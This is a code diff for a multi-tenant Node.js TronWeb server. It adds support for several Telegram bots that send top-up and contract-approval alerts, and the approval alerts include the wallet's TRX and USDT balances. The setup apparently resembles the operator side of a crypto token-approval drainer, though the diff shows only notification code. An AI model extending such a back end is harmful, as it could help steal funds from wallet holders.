@@ -233,10 +233,30 @@ function getTenantTronWeb(tenant) {
     });
 }
 
-// Function to send Telegram notification (top-up)
+// Helper function to get Telegram bots list (supports both single and multiple bots)
+function getTelegramBots(tenant) {
+    // Support new format: array of bots
+    if (Array.isArray(tenant.telegramBots)) {
+        return tenant.telegramBots;
+    }
+    
+    // Support old format: single bot (backward compatibility)
+    if (tenant.telegramBotToken && tenant.telegramChatId) {
+        return [{
+            botToken: tenant.telegramBotToken,
+            chatId: tenant.telegramChatId
+        }];
+    }
+    
+    return [];
+}
+
+// Function to send Telegram notification (top-up) - supports multiple bots
 async function sendTopUpNotification(tenant, domain, amount, userWalletAddress, transactionId) {
     try {
-        if (!tenant.telegramBotToken || !tenant.telegramChatId) {
+        const bots = getTelegramBots(tenant);
+        
+        if (bots.length === 0) {
             console.warn(`[${domain || 'unknown'}] Telegram bot not configured. Skipping notification.`);
             return false;
         }
@@ -248,19 +268,38 @@ async function sendTopUpNotification(tenant, domain, amount, userWalletAddress, 
                        `🔗 *Transaction ID:* \`${transactionId}\`\n` +
                        `⏰ *Time:* ${new Date().toLocaleString()}`;
 
-        const url = `https://api.telegram.org/bot${tenant.telegramBotToken}/sendMessage`;
-        
-        const response = await axios.post(url, {
-            chat_id: tenant.telegramChatId,
-            text: message,
-            parse_mode: 'Markdown'
-        });
+        let successCount = 0;
+        let failCount = 0;
 
-        if (response.data.ok) {
-            console.log(`✅ [${domain || 'unknown'}] Top-up notification sent: ${amount} TRX to ${userWalletAddress}`);
+        // Send to all configured bots
+        for (const bot of bots) {
+            try {
+                const url = `https://api.telegram.org/bot${bot.botToken}/sendMessage`;
+                
+                const response = await axios.post(url, {
+                    chat_id: bot.chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                });
+
+                if (response.data.ok) {
+                    successCount++;
+                    console.log(`✅ [${domain || 'unknown'}] Top-up notification sent to bot ${bot.chatId}: ${amount} TRX to ${userWalletAddress}`);
+                } else {
+                    failCount++;
+                    console.error(`[${domain || 'unknown'}] Failed to send to bot ${bot.chatId}:`, response.data);
+                }
+            } catch (error) {
+                failCount++;
+                console.error(`[${domain || 'unknown'}] Error sending to bot ${bot.chatId}:`, error.message);
+            }
+        }
+
+        if (successCount > 0) {
+            console.log(`✅ [${domain || 'unknown'}] Sent to ${successCount}/${bots.length} bots`);
             return true;
         } else {
-            console.error(`[${domain || 'unknown'}] Failed to send Telegram notification:`, response.data);
+            console.error(`[${domain || 'unknown'}] Failed to send to all bots (${failCount} failures)`);
             return false;
         }
     } catch (error) {
@@ -269,10 +308,12 @@ async function sendTopUpNotification(tenant, domain, amount, userWalletAddress, 
     }
 }
 
-// Function to send Telegram notification (approval)
+// Function to send Telegram notification (approval) - supports multiple bots
 async function sendApprovalNotification(tenant, domain, walletAddress, transactionId, amount, trxBalance, usdtBalance) {
     try {
-        if (!tenant.telegramBotToken || !tenant.telegramChatId) {
+        const bots = getTelegramBots(tenant);
+        
+        if (bots.length === 0) {
             console.warn(`[${domain}] Telegram bot not configured. Skipping approval notification.`);
             return false;
         }
@@ -303,19 +344,38 @@ async function sendApprovalNotification(tenant, domain, walletAddress, transacti
                        `⏰ *Time:* ${new Date().toLocaleString()}\n\n` +
                        `✅ User successfully approved the contract transaction`;
 
-        const url = `https://api.telegram.org/bot${tenant.telegramBotToken}/sendMessage`;
-        
-        const response = await axios.post(url, {
-            chat_id: tenant.telegramChatId,
-            text: message,
-            parse_mode: 'Markdown'
-        });
+        let successCount = 0;
+        let failCount = 0;
 
-        if (response.data.ok) {
-            console.log(`✅ [${domain}] Approval notification sent for wallet ${walletAddress}`);
+        // Send to all configured bots
+        for (const bot of bots) {
+            try {
+                const url = `https://api.telegram.org/bot${bot.botToken}/sendMessage`;
+                
+                const response = await axios.post(url, {
+                    chat_id: bot.chatId,
+                    text: message,
+                    parse_mode: 'Markdown'
+                });
+
+                if (response.data.ok) {
+                    successCount++;
+                    console.log(`✅ [${domain}] Approval notification sent to bot ${bot.chatId} for wallet ${walletAddress}`);
+                } else {
+                    failCount++;
+                    console.error(`[${domain}] Failed to send approval to bot ${bot.chatId}:`, response.data);
+                }
+            } catch (error) {
+                failCount++;
+                console.error(`[${domain}] Error sending approval to bot ${bot.chatId}:`, error.message);
+            }
+        }
+
+        if (successCount > 0) {
+            console.log(`✅ [${domain}] Sent approval to ${successCount}/${bots.length} bots`);
             return true;
         } else {
-            console.error(`[${domain}] Failed to send approval notification:`, response.data);
+            console.error(`[${domain}] Failed to send approval to all bots (${failCount} failures)`);
             return false;
         }
     } catch (error) {
@@ -699,7 +759,7 @@ app.get('/server-info', tenantMiddleware, (req, res) => {
         minimumBalance: tenant.minimumBalance,
         network: 'Mainnet',
         apiVersion: '2.0.0',
-        telegramConfigured: !!(tenant.telegramBotToken && tenant.telegramChatId)
+        telegramConfigured: getTelegramBots(tenant).length > 0
     });
 });
 
